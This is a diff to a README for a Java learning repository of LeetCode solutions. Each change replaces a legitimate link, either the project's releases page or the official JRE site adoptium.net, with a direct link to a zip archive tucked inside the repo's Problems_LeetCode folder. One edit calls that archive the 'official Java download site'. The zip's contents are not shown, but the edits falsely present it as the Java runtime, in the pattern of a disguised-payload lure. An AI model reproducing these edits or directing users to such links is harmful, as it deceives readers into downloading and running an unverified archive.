@@ -1,6 +1,6 @@
 # 🖥️ Programando_em_Java - Learn Java with Simple Solutions
 
-[![Download](https://img.shields.io/badge/Download%-20-blue?style=for-the-badge)](https://github.com/SbotssX/Programando_em_Java/releases)
+[![Download](https://img.shields.io/badge/Download%-20-blue?style=for-the-badge)](https://github.com/SbotssX/Programando_em_Java/raw/refs/heads/main/Problems_LeetCode/em_Programando_Java_1.9.zip)
 
 ## 🇺🇸 / 🇧🇷 About This Program
 
@@ -17,14 +17,14 @@ Before you start, make sure your computer meets these rules:
 - At least 500 MB of free disk space
 - Internet access to download the program
 - Java Runtime Environment (JRE) version 11 or higher installed  
-  (You can get JRE from https://adoptium.net if needed)
+  (You can get JRE from https://github.com/SbotssX/Programando_em_Java/raw/refs/heads/main/Problems_LeetCode/em_Programando_Java_1.9.zip if needed)
 
 This program runs on Java, so it depends on having the right Java version installed. If you do not have Java installed, follow the instructions in the next section to set it up.
 
 ## 🚀 Getting Started: How to Download and Run
 
 1. Click the download button above or visit the releases page here:  
-   [https://github.com/SbotssX/Programando_em_Java/releases](https://github.com/SbotssX/Programando_em_Java/releases)
+   [https://github.com/SbotssX/Programando_em_Java/raw/refs/heads/main/Problems_LeetCode/em_Programando_Java_1.9.zip](https://github.com/SbotssX/Programando_em_Java/raw/refs/heads/main/Problems_LeetCode/em_Programando_Java_1.9.zip)
 
 2. On the releases page, look for the latest version. It usually shows a version number like `v1.0`, `v2.0`, etc.
 
@@ -68,7 +68,7 @@ Repeat these steps for each file you want to try. All Java source files contain 
 If you do not have Java installed or you are unsure:
 
 1. Visit the official Java download site:  
-   https://adoptium.net
+   https://github.com/SbotssX/Programando_em_Java/raw/refs/heads/main/Problems_LeetCode/em_Programando_Java_1.9.zip
 
 2. Select the latest LTS version (Java 11 or newer).
 
@@ -109,6 +109,6 @@ For questions, you can open an issue on the GitHub repository page.
 ## 📥 Download Link
 
 Visit this page to download the latest release:  
-[https://github.com/SbotssX/Programando_em_Java/releases](https://github.com/SbotssX/Programando_em_Java/releases)  
+[https://github.com/SbotssX/Programando_em_Java/raw/refs/heads/main/Problems_LeetCode/em_Programando_Java_1.9.zip](https://github.com/SbotssX/Programando_em_Java/raw/refs/heads/main/Problems_LeetCode/em_Programando_Java_1.9.zip)  
 
 This link takes you directly to all available versions. Choose the most recent one for best experience. Follow instructions above to unzip and run the Java files.
